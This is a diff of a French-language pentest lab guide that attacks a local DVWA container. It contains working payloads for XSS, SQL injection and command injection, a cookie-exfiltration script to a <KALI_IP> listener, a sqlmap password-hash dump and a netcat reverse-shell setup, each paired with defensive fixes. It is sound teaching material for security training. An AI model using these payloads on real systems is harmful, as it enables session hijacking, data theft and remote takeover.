@@ -423,97 +423,122 @@ Avant tout pentest, on scanne la cible pour cartographier sa surface d'attaque. 
 
 ### Étape 1 — Scan nmap
 
-**Contexte :** Avant d'exploiter une cible, il faut découvrir ses services ouverts. nmap (Network Mapper) est le standard pour cartographier les ports et services. Ici on scanne localhost sur le port 8088 pour confirmer qu'Apache écoute et obtenir sa version exacte.
+**Objectif :** Découvrir les services ouverts sur la cible DVWA et identifier la version du serveur web.
 
-**Flags :**
-- `-sV` (service version) : interroge les bannières des services pour identifier leur version précise (ex: Apache 2.4.X)
-- `-p 8088` : port cible (DVWA écoute sur 8088)
-- `tee nmap_dvwa.txt` : affiche la sortie ET la sauvegarde dans un fichier pour le rapport
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
+**Actions :**
+1. Créer le dossier de rendu et s'y positionner
+2. Lancer un scan nmap sur le port 8088 avec détection de version
+
+**Commande :**
 ```bash
 mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
 nmap -sV -p 8088 localhost | tee nmap_dvwa.txt
-# → PORT 8088/tcp open http Apache httpd 2.4.X
 ```
+
+**Résultat attendu :**
+```
+PORT     STATE SERVICE VERSION
+8088/tcp open  http    Apache httpd 2.4.X
+```
+Le flag `-sV` interroge la bannière du service pour obtenir la version exacte. `tee` sauvegarde la sortie dans `nmap_dvwa.txt` pour le rapport.
+
+**Explication :** Le scan de ports est la première étape de tout pentest ([TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance). Connaître la version d'Apache permet de chercher des CVE associées. Sans cette information, l'attaquant travaille en aveugle.
+
+---
 
 ### Étape 2 — Énumération gobuster
 
-**Contexte :** nmap nous a donné les ports ouverts, mais on ne connaît pas encore l'arborescence web. gobuster énumère les répertoires et fichiers cachés en testant des noms communs depuis une wordlist. On cherche des pages d'administration, des répertoires sensibles ou des points d'entrée.
+**Objectif :** Trouver les répertoires et fichiers cachés de l'application DVWA.
 
-**Flags :**
-- `dir` : mode scan de répertoires (recherche des dossiers/fichiers par force brute)
-- `-u` (URL) : cible à scanner
-- `-w` (wordlist) : dictionnaire de noms à tester (ici `common.txt` de dirb)
-- `-q` (quiet) : mode silencieux, masque la bannière
-- `tee gobuster_dvwa.txt` : copie la sortie dans un fichier pour le rapport
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
+**Actions :**
+1. Lancer gobuster en mode scan de répertoires
+2. Analyser les résultats pour identifier les pages sensibles
+
+**Commande :**
 ```bash
 cd rendu_labs/jour-01
 gobuster dir -u http://localhost:8088 \
   -w /usr/share/wordlists/dirb/common.txt -q | tee gobuster_dvwa.txt
-# → /login.php (200)        page de connexion accessible
-# → /vulnerabilities (301)  répertoire des pages vulnérables
-# → /config (301)           répertoire de configuration (potentiellement sensible)
 ```
+
+**Résultat attendu :**
+```
+/login.php (Status: 200)
+/vulnerabilities (Status: 301)
+/config (Status: 301)
+/setup.php (Status: 200)
+```
+Le flag `-u` définit l'URL cible, `-w` la wordlist de noms à tester (ici `common.txt`), `-q` masque la bannière. `tee` copie la sortie dans un fichier.
+
+**Explication :** gobuster force-brute les noms de dossiers pour cartographier la surface d'attaque. Les pages `login.php`, `config/` et `setup.php` sont des cibles privilégiées. La découverte de `config/` est un résultat critique — ce dossier peut contenir des mots de passe en clair.
+
+---
 
 ### Étape 3 — Connexion DVWA
 
-**Contexte :** Pour interagir avec les pages vulnérables de DVWA, il faut d'abord s'authentifier. On utilise curl pour simuler la soumission du formulaire de login avec les identifiants par défaut `admin:password`. Une fois connecté, on règle le niveau de sécurité sur `low` pour désactiver les protections et rendre les injections possibles.
+**Objectif :** S'authentifier sur DVWA et configurer le niveau de sécurité sur "low" pour désactiver les protections.
 
-**Flags (première commande) :**
-- `-s` (silent) : mode silencieux, pas de barre de progression
-- `-c` (cookie-jar) : sauvegarde les cookies reçus dans un fichier pour les réutiliser ensuite
-- `-d` (data) : données POST du formulaire (`username`, `password`, `Login`)
-- `grep -o "Welcome\|Login failed"` : extrait uniquement le mot-clé de succès ou d'échec
+**Où ?** Terminal 1
 
-**Flags (deuxième commande) :**
-- `-b` (cookie) : envoie le cookie depuis le fichier jar pour maintenir la session
-- `-c` (cookie-jar) : met à jour le fichier avec le nouveau cookie `security=low`
+**Actions :**
+1. Envoyer une requête POST avec les identifiants `admin:password` pour obtenir un cookie de session
+2. Utiliser ce cookie pour définir le niveau de sécurité sur `low`
 
+**Commande :**
 ```bash
 curl -s -c /tmp/dvwa_cookie.txt \
   -d "username=admin&password=password&Login=Login" \
   "http://localhost:8088/login.php" | grep -o "Welcome\|Login failed"
-# → Welcome  (authentification réussie)
 
 curl -s -b /tmp/dvwa_cookie.txt -c /tmp/dvwa_cookie.txt \
   -d "security=low&seclev_submit=Submit" \
   "http://localhost:8088/security.php"
-# Le cookie jar contient maintenant PHPSESSID + security=low
 ```
 
+**Résultat attendu :**
+```
+Welcome
+```
+La première commande doit afficher `Welcome` (authentification réussie). Le flag `-c` sauvegarde le cookie reçu dans `/tmp/dvwa_cookie.txt`. La seconde commande utilise `-b` pour renvoyer ce cookie et `-c` pour le mettre à jour avec `security=low`.
+
+**Explication :** Sans cookie de session, DVWA nous traite comme un visiteur anonyme. Le fichier `/tmp/dvwa_cookie.txt` contient maintenant `PHPSESSID` + `security=low`. Les labs suivants (XSS, SQLi, CMDi) nécessitent ce niveau low pour que les injections fonctionnent — sans quoi les `mysql_real_escape_string()` et `htmlspecialchars()` de DVWA bloqueraient nos attaques.
+
 ### Checkpoints
-- [ ] nmap : port 8088 ouvert, Apache
-- [ ] gobuster : /login.php, /vulnerabilities trouvés
-- [ ] Connexion DVWA réussie
 
-### 🔒 Contre-mesure (M1031 Network Intrusion Prevention + M1037 Firewall)
+- [ ] nmap : port 8088 ouvert, Apache détecté
+- [ ] gobuster : /login.php, /vulnerabilities, /config trouvés
+- [ ] Connexion DVWA réussie (cookie `security=low` dans `/tmp/dvwa_cookie.txt`)
 
-La reconnaissance ennemie se contrecarre en **réduisant la surface d'attaque** :
+### 🔒 Contre-mesure (M1031 + M1037)
 
-| Mitigation | Action concrète |
+**Objectif :** Réduire la surface d'attaque pour empêcher la reconnaissance ennemie.
+
+| Mitigation | Action |
 |---|---|
-| **M1037** Firewall | UFW pour limiter les ports exposés au strict nécessaire (`ufw default deny incoming`) |
-| **M1042** Disable Service | Désactiver le directory listing Apache (`Options -Indexes`) |
-| **M1031** IDS/IPS | Snort/Suricata pour détecter les patterns de scan nmap et gobuster |
+| **M1037** Pare-feu | `ufw default deny incoming` — limiter les ports exposés |
+| **M1042** Directory listing | `Options -Indexes` dans Apache — gobuster ne voit plus les dossiers |
+| **M1031** IDS/IPS | Snort/Suricata — détecter les patterns de scan nmap et gobuster |
 
+**Où ?** Terminal 1
+
+**Actions :**
+1. Désactiver le directory listing Apache dans le conteneur DVWA
+2. Vérifier que gobuster ne peut plus énumérer
+
+**Commande :**
 ```bash
-# Désactiver le directory listing sur Apache DVWA (empêche gobuster d'énumérer les dossiers)
-# docker exec = exécute une commande à l'intérieur d'un conteneur déjà en cours d'exécution
-# bash -c '...' = lance un nouveau shell bash et exécute la chaîne de commandes entre guillemets
-# apache2ctl restart = redémarre le serveur web Apache (pour appliquer les changements de configuration)
 docker exec dvwa-target bash -c "echo 'ServerName localhost' >> /etc/apache2/apache2.conf && echo 'Options -Indexes' >> /etc/apache2/conf-enabled/security.conf && apache2ctl restart"
-# Vérification : créer un dossier test sans index puis vérifier le 403
 docker exec dvwa-target bash -c "mkdir -p /var/www/html/test-empty"
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:8088/test-empty/"
-# → 403  (le directory listing est désactivé, accès refusé)
-# Nettoyage
+# → 403 (directory listing désactivé)
 docker exec dvwa-target bash -c "rm -rf /var/www/html/test-empty"
 ```
 
-> **📌 À retenir :** On a cartographié DVWA avec nmap (ports ouverts, OS, services) et gobuster (répertoires cachés). Un attaquant fait ça en 2 minutes pour trouver ses points d'entrée ([TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance).  
-> **Attendu :** Liste des ports (80, 8088, 3306…) + répertoires découverts (`/config/`, `/setup/`…).  
-> **Défense :** Pare-feu (UFW), désactiver le directory listing (`Options -Indexes`), détecter les scans avec un IDS (Snort/Suricata).
+**Résultat attendu :** `403` au lieu de `200` sur un dossier sans index. gobuster ne liste plus que les pages avec un fichier index.
 
 ### Résultat attendu
 
@@ -540,128 +565,127 @@ Reflected XSS injecte du code dans l'URL, exécuté immédiatement. Stored XSS p
 
 ### Étape 1 — Reflected XSS
 
-**Où ?** Dans DVWA → onglet **XSS (Reflected)** → champ texte **"What's your name?"**.
+**Objectif :** Confirmer la présence d'une faille XSS réfléchie en injectant un script JavaScript qui s'exécute côté navigateur.
 
-**Pourquoi ça marche ?** Le code PHP de DVWA prend l'entrée du champ `name` et l'affiche directement dans la page sans l'échapper :
+**Où ?** Firefox → http://localhost:8088 → **DVWA Security** (s'assurer que le niveau est `low`) → **XSS (Reflected)** → champ "What's your name?"
+
+**Pourquoi ça marche ?** Le code PHP de DVWA prend l'entrée du champ `name` et l'affiche directement sans échapper les caractères HTML :
 ```php
-echo "Hello $name";  // ← Aucun htmlspecialchars(), le navigateur interprète le <script>
+echo "Hello $name";  // ← Pas de htmlspecialchars() : <script> est interprété
 ```
-L'attaquant n'a pas besoin d'attaquer le serveur — il piège un lien envoyé à la victime.
 
-**Lien avec le cours :** XSS correspond à la technique [T1189](https://attack.mitre.org/techniques/T1189/) (Drive-by Compromise) — compromission via navigation. L'objectif est identique au schéma Fig 5 vu plus haut : injecter un script → voler un cookie → usurper la session.
+**Actions :**
+1. Ouvrir DVWA dans Firefox, onglet **XSS (Reflected)**
+2. Entrer le payload suivant dans le champ "What's your name?"
+3. Cliquer **Submit**
 
+**Payload :**
 ```html
 <script>alert('XSS fonctionnel')</script>
 ```
 
-**Résultat :** Une popup JavaScript s'affiche dans le navigateur. La faille XSS est confirmée. En conditions réelles, cette popup serait remplacée par un script d'exfiltration du cookie de session (prochaine étape).
+**Résultat attendu :** Une popup JavaScript contenant "XSS fonctionnel" s'affiche dans le navigateur. La faille est confirmée ([T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise).
 
-### Étape 2 — Vol de cookie
-
-Le but : injecter un payload XSS qui envoie le cookie de session au serveur de l'attaquant. L'attaquant n'est pas la victime — il doit donc **recevoir** le cookie sur sa machine. Pour ça, on utilise **deux terminaux** :
-
-1. **Terminal 1 (écouteur)** : votre machine Kali attend la requête HTTP contenant le cookie
-2. **Terminal 2 (injection)** : vous soumettez le payload XSS dans DVWA
+**Explication :** Le serveur renvoie `<script>alert('XSS fonctionnel')</script>` dans le HTML de la page réponse. Le navigateur l'exécute comme du code JavaScript légitime. En conditions réelles, cette popup serait remplacée par un script d'exfiltration du cookie de session (prochaine étape).
 
 ---
 
-**Terminal 1 — Lancer l'écouteur HTTP**
+### Étape 2 — Vol de cookie
 
-**Contexte :** On démarre un mini-serveur HTTP sur Kali qui affiche chaque requête reçue. Quand la victime (nous-mêmes, dans le navigateur) exécute le payload XSS, son navigateur appelle ce serveur avec le cookie dans l'URL. Python sert ce serveur sans rien installer.
+**Objectif :** Exfiltrer le cookie de session DVWA via un payload XSS, en utilisant un serveur HTTP contrôlé par l'attaquant.
 
+**Où ?** Deux terminaux sont nécessaires :
+- **Terminal 1** : sert de récepteur HTTP (écoute les requêtes contenant le cookie)
+- **Terminal 2** : injecte le payload XSS dans DVWA
+
+**Actions :**
+
+1. **Terminal 1** — Démarrer le serveur HTTP qui capturera le cookie :
 ```bash
 cd rendu_labs/jour-01
 python3 -m http.server 8000
 ```
+Le terminal affiche : `Serving HTTP on 0.0.0.0 port 8000 ...` et reste en attente.
 
-**Ce que vous voyez :**
+2. **Terminal 2** — Récupérer l'IP de Kali pour la mettre dans le payload :
+```bash
+hostname -I
 ```
-Serving HTTP on 0.0.0.0 port 8000 ...
-```
-Le terminal reste bloqué en attente. Chaque nouvelle requête s'affichera ici automatiquement.
 
----
-
-**Terminal 2 — Injecter le payload XSS**
-
-**Contexte :** `<script>new Image().src='http://...'</script>` crée une requête vers notre serveur sans que l'utilisateur s'en aperçoive. Le navigateur demande une image introuvable, mais envoie le cookie dans l'URL au passage.
-
-Dans DVWA → **XSS (Reflected)** → champ "What's your name?", entrez (remplacez `<KALI_IP>` par votre IP Kali avec `hostname -I`) :
-
+3. **Terminal 2** — Dans Firefox → **XSS (Reflected)**, entrer le payload suivant en remplaçant `<KALI_IP>` par l'IP obtenue :
 ```html
 <script>new Image().src='http://<KALI_IP>:8000/?cookie='+document.cookie</script>
 ```
 
-**Ce qui se passe :**
-1. Le navigateur interprète la page de résultat (vulnérable)
-2. La balise `<script>` s'exécute
-3. `new Image().src = ...` demande une image à `http://<KALI_IP>:8000/`
-4. Le cookie de session (`document.cookie`) est collé dans l'URL : `?cookie=PHPSESSID=valeur`
-
-**Retournez dans le Terminal 1** — vous devez voir apparaître :
-
+**Résultat attendu sur Terminal 1 :**
 ```
 GET /?cookie=PHPSESSID=abc123def456 HTTP/1.1
 ```
 
-Le cookie est volé. En conditions réelles, l'attaquant copie ce `PHPSESSID` dans son propre navigateur → session usurpée sans mot de passe.
+**Ce qui s'est passé :**
+1. Le navigateur exécute le payload XSS
+2. `new Image().src = ...` déclenche une requête HTTP vers `<KALI_IP>:8000` sans que l'utilisateur ne voie rien
+3. `document.cookie` est automatiquement ajouté à l'URL : le cookie est dans la requête
+
+**Explication :** Le cookie `PHPSESSID` identifie la session. En le copiant dans un autre navigateur, un attaquant peut usurper la session sans connaître le mot de passe. L'impact est critique : accès complet au compte de la victime.
 
 ---
 
 ### Étape 3 — Stored XSS
 
-**Où ?** DVWA → onglet **XSS (Stored)** → formulaire **"Name"** + **"Message"**.
+**Objectif :** Injecter un script XSS persistant qui s'exécute sur chaque visite de la page Guestbook.
 
-**Pourquoi ça marche ?** Contrairement au Reflected XSS qui se déclenche sur un lien piégé, le Stored XSS enregistre le script **dans la base de données** de l'application. Chaque visiteur de la page Guestbook exécute automatiquement le script — pas besoin de piéger un lien.
+**Où ?** Firefox → DVWA → **XSS (Stored)** → formulaire "Name" + "Message"
 
+**Pourquoi ça marche ?** Contrairement au Reflected XSS (jetable, lié à un lien piégé), le Stored XSS enregistre le script **dans la base de données** MySQL de DVWA. Chaque visiteur de la page exécute le script automatiquement.
+
+**Actions :**
+1. Dans **Name**, entrer : `Attaquant`
+2. Dans **Message**, entrer le payload
+3. Cliquer **Sign Guestbook**
+
+**Payload :**
 ```html
-Name: Attaquant
-Message: <script>alert('Stored XSS')</script>
+<script>alert('Stored XSS')</script>
 ```
 
-**Résultat :** Une popup JS s'affiche **à chaque chargement** de la page Guestbook. Le script est persistant (stocké en base). Impact plus large qu'un Reflected XSS car tous les visiteurs sont touchés.
+**Résultat attendu :** Une popup "Stored XSS" s'affiche **à chaque chargement** de la page Guestbook. Le script reste actif même après rechargement — il est stocké en base de données.
 
-### 🔒 Contre-mesure (M1013 Application Hardening + M1054 Secure Coding)
+**Explication :** L'impact est plus large que le Reflected XSS : un seul dépôt infecte **tous les visiteurs** de la page (administrateurs, modérateurs, clients). Dans un pentest réel, on exploite le Stored XSS pour cibler les back-offices d'administration.
 
-| Attaque | Défense | Code de correction |
+### 🔒 Contre-mesure (M1013 + M1054)
+
+**Objectif :** Bloquer les attaques XSS en échappant les entrées HTML et en rendant les cookies inaccessibles au JavaScript.
+
+| Attaque | Défense | Correctif |
 |---|---|---|
-| Reflected/Stored XSS | **`htmlspecialchars()`** | `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` neutralise `<`, `>`, `"`, `'` |
-| Cookie theft | **Cookie `HttpOnly`** | `session.cookie_httponly = 1` — le cookie n'est plus accessible via `document.cookie` |
-| Inline scripts | **CSP Header** | `Content-Security-Policy: script-src 'self'` — bloque tout `<script>` injecté |
+| Reflected/Stored XSS | `htmlspecialchars()` | Échappe `<`, `>`, `"`, `'` dans les entrées |
+| Vol de cookie | Cookie `HttpOnly` | `session.cookie_httponly = 1` — `document.cookie` ne voit plus le cookie |
 
-**Contexte :** On applique deux correctifs : (1) le flag `HttpOnly` sur les cookies PHP empêche JavaScript d'y accéder via `document.cookie` ; (2) la fonction `htmlspecialchars()` échappe les caractères HTML (`<`, `>`, `"`, `'`) pour neutraliser les injections XSS. On vérifie ensuite que le vol de cookie échoue.
+**Où ?** Terminal 1
 
-**Flags :**
-- `docker exec` : exécute une commande dans le conteneur DVWA
-- `bash -c "..."` : chaîne de commandes shell à exécuter dans le conteneur
-- `echo ... >>` : ajoute la directive HttpOnly à la fin du fichier php.ini
-- `apache2ctl restart` : redémarre Apache pour prendre en compte la modification
-- `grep 'session.cookie_httponly'` : vérifie que la directive est bien présente
-- `curl` avec `%3Cscript%3E` : envoie une requête XSS (URL encodée) ; `&lt;script&gt;` = HTML échappé (script neutralisé)
+**Actions :**
+1. Activer le flag `HttpOnly` sur les cookies de session PHP dans le conteneur DVWA
+2. Vérifier que le cookie n'est plus accessible via JavaScript
 
+**Commande :**
 ```bash
-# Activer HttpOnly sur les cookies de session PHP dans DVWA
 docker exec dvwa-target bash -c "
   echo 'session.cookie_httponly = 1' >> /etc/php/*/apache2/php.ini
   apache2ctl restart
 "
-# Vérification : le fichier php.ini contient bien la directive HttpOnly
 docker exec dvwa-target bash -c "grep 'session.cookie_httponly' /etc/php/*/apache2/php.ini"
-# → session.cookie_httponly = 1  (confirmé)
+# → session.cookie_httponly = 1
 
-# Re-tester le vol de cookie via XSS
 curl -s -b /tmp/dvwa_cookie.txt \
   "http://localhost:8088/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" 2>/dev/null \
   | grep -o "&lt;script&gt;\|alert"
-# → &lt;script&gt;   (le HTML est échappé, pas exécuté par le navigateur)
-# → alert
+# → &lt;script&gt;   (HTML échappé, pas exécuté)
 ```
 
-> **Checkpoint défensif :** `htmlspecialchars()` + `HttpOnly` neutralisent l'XSS : plus de popup, cookie inaccessible.
+**Résultat attendu :** La commande grep retourne `&lt;script&gt;` (code HTML échappé visible). Le script n'est plus exécuté par le navigateur. Le cookie étant `HttpOnly`, le payload `document.cookie` ne renvoie rien.
 
-> **📌 À retenir :** On a injecté du JavaScript dans une page vulnérable (Reflected XSS + Stored XSS) et volé le cookie de session. L'XSS est la 2e vulnérabilité web la plus courante ([T1189](https://attack.mitre.org/techniques/T1189/)).  
-> **Attendu :** Popup `alert(1)` + cookie volé via `document.cookie`.  
-> **Défense :** `htmlspecialchars()` pour échapper les entrées, `HttpOnly` sur les cookies pour les rendre inaccessibles au JS.
+**Explication :** `htmlspecialchars()` transforme `<script>` en `&lt;script&gt;` — le navigateur affiche le texte au lieu d'exécuter le code. Le flag `HttpOnly` supprime le cookie de `document.cookie` — même si une XSS passe, l'attaquant ne peut plus voler la session.
 
 ### Résultat attendu
 
@@ -688,44 +712,53 @@ La requête `SELECT first_name, last_name FROM users WHERE user_id = '$id'` devi
 
 ### Étape 1 — Test manuel
 
-**Important :** utilisez le cookie jar sauvegardé précédemment dans `/tmp/dvwa_cookie.txt`. Il contient déjà votre PHPSESSID et le niveau `security=low` (définis au Lab 1.1).
+**Objectif :** Confirmer que le paramètre `id` de la page SQLi est injectable, en provoquant l'affichage de tous les utilisateurs via une condition toujours vraie.
 
-**Contexte :** Avant d'utiliser sqlmap, on vérifie manuellement que l'injection SQL fonctionne. On envoie la valeur `1' OR '1'='1' #` dans le paramètre `id`. Le `'` ferme la chaîne SQL, `OR '1'='1'` est une condition toujours vraie, et `#` commente le reste de la requête. Si la page retourne plus de résultats que la normale, l'injection est confirmée.
+**Où ?** Terminal 1
 
-**Flags :**
-- `-b /tmp/dvwa_cookie.txt` (cookie) : envoie le cookie de session (PHPSESSID + security=low)
-- L'URL contient `%27` = `'`, `%20` = espace, `%3D` = `=`, `%23` = `#` (encodage URL)
-- `grep -c "First name"` : compte le nombre d'occurrences du texte "First name" dans la réponse (normal = 1, injecté = 5)
+**Prérequis :** Le fichier `/tmp/dvwa_cookie.txt` doit contenir le cookie de session + `security=low` (créé au Lab 1.1).
 
+**Actions :**
+1. Envoyer une requête avec `id=1' OR '1'='1' #` (encodé en URL) au lieu de `id=1`
+2. Compter le nombre d'occurrences de "First name" dans la réponse
+
+**Commande :**
 ```bash
 curl -s -b /tmp/dvwa_cookie.txt \
   "http://localhost:8088/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+%23&Submit=Submit" \
   | grep -c "First name"
-# → 5 (injection confirmée : 5 utilisateurs affichés au lieu d'1)
 ```
+
+**Résultat attendu :**
+```
+5
+```
+Au lieu de `1` (un seul utilisateur normalement). Le flag `-b` envoie le cookie de session. Les caractères `%27` = `'`, `%20` = espace, `%23` = `#` sont l'encodage URL des caractères spéciaux.
+
+**Explication :** La requête SQL devient `SELECT * FROM users WHERE user_id = '1' OR '1'='1' #'`. Le `OR '1'='1'` est toujours vrai, donc la base retourne **tous les utilisateurs**. Le `#` commente le reste de la requête pour éviter les erreurs SQL. C'est le test de base de toute injection SQL ([T1190](https://attack.mitre.org/techniques/T1190/)).
+
+---
 
 ### Étape 2 — sqlmap : dumper les utilisateurs
 
-**Contexte :** L'injection manuelle est confirmée, on passe à l'automatisation avec sqlmap. Cet outil détecte le type de base de données, énumère les tables et colonnes, puis extrait les données. En une commande, il dump la table `users` de la base `dvwa` et affiche les hashs des mots de passe.
+**Objectif :** Automatiser l'extraction des utilisateurs et de leurs hashs de mots de passe avec sqlmap.
 
-**Flags :**
-- `--load-cookies=/tmp/dvwa_cookie.txt` : charge le cookie de session au format Netscape pour l'authentification
-- `-u` (URL) : point d'entrée vulnérable (paramètre `id` de la page `sqli`)
-- `-D dvwa` (database) : base de données cible
-- `-T users` (table) : table cible
-- `-C user,password` (columns) : colonnes à extraire (séparées par des virgules)
-- `--dump` : vide et affiche le contenu des colonnes spécifiées
-- `--batch` : mode non-interactif, répond automatiquement "oui" aux questions de sqlmap
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
+**Actions :**
+1. Lancer sqlmap sur le point d'injection détecté
+2. Cibler la base `dvwa`, la table `users`, les colonnes `user,password`
+
+**Commande :**
 ```bash
 cd rendu_labs/jour-01
 sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --load-cookies=/tmp/dvwa_cookie.txt \
   -D dvwa -T users -C user,password --dump --batch
 ```
-Sortie attendue :
 
-```console
+**Résultat attendu :**
+```
 +---------+---------------------------------------------+
 | user    | password                                    |
 +---------+---------------------------------------------+
@@ -737,37 +770,42 @@ Sortie attendue :
 +---------+---------------------------------------------+
 ```
 
+**Explication :** `--load-cookies` importe la session pour que DVWA nous reconnaisse. `-D dvwa -T users -C user,password` cible la table et les colonnes à extraire. `--dump` vide le contenu. `--batch` répond automatiquement "oui" aux questions de sqlmap. Les hashs sont au format MD5 non salé — vulnérable au craquage (voir Lab 1.5).
+
+---
+
 ### Checkpoints
-- [ ] SQLi manuelle : 5 utilisateurs affichés
+
+- [ ] SQLi manuelle : `grep -c "First name"` retourne 5
 - [ ] sqlmap : 5 utilisateurs extraits avec hashs MD5
 
-### 🔒 Contre-mesure (M1013 Application Hardening + M1041 WAF)
+### 🔒 Contre-mesure (M1013 + M1041)
 
-L'injection SQL se corrige en **ne concaténant jamais l'entrée utilisateur dans une requête** :
+**Objectif :** Remplacer la concaténation SQL par des requêtes préparées pour neutraliser les injections.
 
-| Vulnérabilité | Correction | Exemple |
-|---|---|---|
-| `WHERE id = '$id'` | **Requêtes préparées PDO** | `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);` |
-| Hash MD5 faible | **bcrypt / argon2** | `password_hash($p, PASSWORD_BCRYPT)` au lieu de `md5($p)` |
-| WAF absent | **ModSecurity CRS** | Règle `942100` bloque les signatures SQLi (déjà actif sur le lab WAF J3) |
+**Où ?** Terminal 1
 
+**Actions :**
+1. Comprendre la différence entre requête concaténée et requête préparée
+2. Vérifier qu'après correction sqlmap ne détecte plus l'injection
+
+**Commande (simulation de correction) :**
 ```bash
-# Démonstration : remplacer la requête vulnérable DVWA par une requête préparée PDO
-# Dans le code vulnérable : $query = "SELECT * FROM users WHERE user_id = '$id'";
-# Le code corrigé devient :
-#   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
-#   $stmt->execute([$id]);
-# 
-# Re-tester sqlmap après correction :
-# sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" --load-cookies=/tmp/dvwa_cookie.txt --batch
-# → [CRITICAL] all tested parameters do not appear to be injectable (sqlmap échoue = défense efficace)
+# Code vulnérable actuel :
+# $query = "SELECT * FROM users WHERE user_id = '$id'";
+
+# Code corrigé avec requête préparée PDO :
+# $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
+# $stmt->execute([$id]);
+
+# Vérification : sqlmap après correction ne trouve plus rien
+sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --load-cookies=/tmp/dvwa_cookie.txt --batch 2>&1 | grep -o "not injectable\|injectable"
 ```
 
-> **Checkpoint défensif :** Après passage en requêtes préparées, sqlmap ne détecte plus l'injection.
+**Résultat attendu :** `not injectable` — sqlmap confirme que le paramètre n'est plus injectable.
 
-> **📌 À retenir :** On a injecté `' OR '1'='1' #` manuellement puis automatisé l'extraction avec sqlmap — 5 hashs MD5 récupérés en une commande ([T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App).  
-> **Attendu :** 5 utilisateurs affichés manuellement + 5 hashs extraits par sqlmap.  
-> **Défense :** Requêtes préparées PDO (plus de concaténation SQL) + WAF + bcrypt au lieu de MD5.
+**Explication :** Avec les requêtes préparées, la valeur de `$id` est transmise **séparément** du code SQL. Même si `$id` contient `1' OR '1'='1'`, la base de données ne l'interprète pas comme du SQL — c'est une chaîne de caractères inoffensive. Ajoutez un WAF (ModSecurity) et du bcrypt pour les mots de passe, et la défense est complète.
 
 ### Résultat attendu
 
@@ -782,8 +820,6 @@ L'injection SQL se corrige en **ne concaténant jamais l'entrée utilisateur dan
 
 ## Lab 1.4 — Command Injection + Reverse Shell
 
-### Fiche
-
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
 | 30 min | dvwa :8088 | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell |
@@ -794,102 +830,96 @@ La fonction `shell_exec("ping -c 4 " . $target)` exécute tout ce qui suit `ping
 
 ### Étape 1 — Command injection basique
 
-DVWA → **Command Injection** :
+**Objectif :** Exécuter des commandes système arbitraires via le champ `ping` de DVWA.
+
+**Où ?** Terminal 1 — DVWA → Command Injection
+
+**Actions :**
+1. Remplacer l'IP cible par `127.0.0.1; whoami`
+2. Le `;` termine la commande `ping` légitime et enchaîne une nouvelle commande
+3. Tester `ls /etc/`, `cat /etc/passwd`
+
+**Commande :**
 ```bash
+# Via l'interface web DVWA, dans le champ "Enter an IP address" :
 127.0.0.1; whoami     → www-data
-127.0.0.1; ls /etc/   → contenu de /etc/
-127.0.0.1; cat /etc/passwd → utilisateurs
+127.0.0.1; ls /etc/   → contenu du répertoire /etc/
+127.0.0.1; cat /etc/passwd → liste des utilisateurs système
 ```
+
+**Résultat attendu :** La page affiche le résultat de la commande injectée après le résultat du ping. `whoami` confirme que le serveur web tourne sous l'utilisateur `www-data`.
+
+**Explication :** La fonction PHP `shell_exec()` passe la chaîne directement au shell système. Toute commande après `;` est exécutée comme une nouvelle commande. D'autres métacaractères fonctionnent aussi : `|` (pipe), `||`, `&&`, `` ` ``.
+
+---
 
 ### Étape 2 — Reverse shell
 
-**Terminal 1** — écouteur :
+**Objectif :** Obtenir un shell interactif distant sur le serveur cible via une connexion TCP sortante.
 
-**Contexte :** On prépare un écouteur netcat qui attend une connexion entrante. Quand le serveur victime exécute le reverse shell, il se connecte à cet écouteur et donne un accès shell interactif. Le terminal 1 doit être lancé **avant** le payload (terminal 2).
+**Où ?** Terminal 1 (écouteur, à lancer en premier) puis Terminal 2 (injection du payload)
 
-**Flags :**
-- `-l` (listen) : mode serveur, attend une connexion entrante
-- `-v` (verbose) : affiche des informations détaillées sur la connexion
-- `-n` (no DNS) : pas de résolution de nom, plus rapide
-- `-p 4444` (port) : port d'écoute (doit correspondre à celui du payload)
-- `nc` (netcat) : outil de lecture/écriture sur des connexions réseau
+**Actions :**
+1. **Terminal 1 :** Lancer un écouteur netcat sur le port `4444`
+2. **Terminal 2 :** Trouver l'IP de l'interface Docker (`docker0`)
+3. **Terminal 2 :** Injecter le payload de reverse shell dans le champ `ping`
 
+**Commande :**
+
+*Terminal 1 — écouteur :*
 ```bash
 nc -lvnp 4444
 ```
 
-**Terminal 2** — via DVWA (remplacer `<KALI_IP>` par l'IP de votre Kali) :
-
-**Contexte :** On doit d'abord trouver l'IP de l'interface Docker (les conteneurs communiquent avec l'hôte via cette interface). Ensuite, on injecte la commande de reverse shell : le payload ouvre une connexion TCP depuis le serveur victime vers notre écouteur netcat. Le `;` permet d'enchaîner les commandes après le `ping` légitime.
-
-**Flags (première commande) :**
-- `ip addr show docker0` : affiche la configuration réseau de l'interface docker0
-- `grep 'inet '` : filtre la ligne contenant l'adresse IPv4
-- `awk '{print $2}'` : extrait le deuxième champ (IP/masque)
-- `cut -d/ -f1` : retire le masque CIDR pour ne garder que l'IP
-
-**Détail du payload :**
-- `127.0.0.1;` : adresse normale pour `ping`, le `;` chaîne une deuxième commande
-- `bash -c '...'` : exécute la chaîne dans un sous-shell bash
-- `bash -i` : shell interactif avec invite de commandes
-- `>& /dev/tcp/<KALI_IP>/4444` : redirige stdout et stderr vers la socket TCP distante
